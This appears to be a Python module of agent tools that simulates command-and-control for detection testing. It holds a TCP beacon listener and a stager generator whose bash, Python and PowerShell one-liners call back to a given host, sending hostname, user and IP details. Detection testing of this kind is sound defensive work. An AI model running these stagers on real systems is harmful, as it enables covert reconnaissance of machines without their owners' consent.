# ruff: noqa: E501, S104, S112
"""Command & Control simulation: C2 server, stagers, beacon listeners for detection testing."""
from __future__ import annotations

import socket
import threading
import time

from core.skills.registry import tool

_C2_SERVERS: dict[int, dict] = {}
_BEACON_DATA: list[dict] = []


@tool()
def start_c2_server(port: int = 4444, protocol: str = "tcp") -> str:
    """Start a simple C2 listener on a port to receive beacon callbacks."""
    try:
        if protocol == "tcp":
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", port))
            server.listen(5)
            server.settimeout(1.0)

            def serve(sock, p):
                _C2_SERVERS[p] = {"socket": sock, "running": True, "beacons": []}
                while _C2_SERVERS.get(p, {}).get("running", False):
                    try:
                        conn, addr = sock.accept()
                        data = conn.recv(4096)
                        beacon = {"source": f"{addr[0]}:{addr[1]}", "data": data.decode(errors="replace")[:500], "time": time.time()}
                        _C2_SERVERS[p]["beacons"].append(beacon)
                        _BEACON_DATA.append(beacon)
                        conn.send(b"ACK")
                        conn.close()
                    except TimeoutError:
                        continue
                    except Exception:
                        continue

            t = threading.Thread(target=serve, args=(server, port), daemon=True)
            t.start()
            return f"C2 server started on port {port} (TCP, thread={t.name})"
        else:
            return f"Unsupported protocol: {protocol}. Use 'tcp'"
    except PermissionError:
        return f"Permission denied for port {port} (need root for ports < 1024)"
    except OSError as e:
        return f"Socket error: {e}"
    except Exception as e:
        return f"C2 server start failed: {e}"


@tool()
def generate_stager(host: str, port: int = 4444, format_type: str = "bash") -> str:
    """Generate a beacon stager script that calls back to the C2 server."""
    try:
        stagers = {
            "bash": (
                f"#!/bin/bash\n"
                f'exec 3<>/dev/tcp/{host}/{port}\n'
                f'echo "HOSTNAME=$(hostname);USER=$(whoami);IP=$(hostname -I)" >&3\n'
                f'read -t 5 response <&3\n'
                f'echo "{{response}}"\n'
                f'exec 3>&-'
            ),
            "python": (
                f"import socket;s=socket.socket();s.connect(('{host}',{port}));\n"
                f"s.send(f'{{__import__(\"socket\").gethostname()}}'.encode());\n"
                f"print(s.recv(4096));s.close()"
            ),
            "powershell": (
                f"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});\n"
                f"$s=$c.GetStream();$b=New-Object byte[] 1024;\n"
                f"$e=New-Object Text.ASCIIEncoding;$s.Write($e.GetBytes('beacon'),0,6)"
            ),
        }
        if format_type not in stagers:
            return f"Unsupported format '{format_type}'. Available: {', '.join(stagers)}"
        stager = stagers[format_type]
        size = len(stager)
        return f"Stager ({format_type}, {size} bytes):\n\n{stager}"
    except Exception as e:
        return f"Stager generation failed: {e}"


@tool()
def listen_for_beacons(duration_sec: int = 10) -> str:
    """Listen for and display any beacons received by the C2 server."""
    try:
        if not _C2_SERVERS:
            return "No C2 servers running. Use start_c2_server() first."
        time.sleep(min(duration_sec, 30))
        total = 0
        lines = []
        for port, server in _C2_SERVERS.items():
            beacons = server.get("beacons", [])
            recent = [b for b in beacons if b["time"] > time.time() - duration_sec]
            total += len(recent)
            if recent:
                lines.append(f"  Port {port}: {len(recent)} beacons")
                for b in recent[-5:]:
                    src = b["source"]
                    data = b["data"][:100]
                    lines.append(f"    {src} → {data}")
        if total == 0:
            return f"No beacons received in the last {duration_sec}s ({sum(len(s.get('beacons', [])) for s in _C2_SERVERS.values())} total)"
        return f"Beacon report ({total} new, {sum(len(s.get('beacons', [])) for s in _C2_SERVERS.values())} total):\n" + "\n".join(lines)
    except Exception as e:
        return f"Beacon listening failed: {e}"
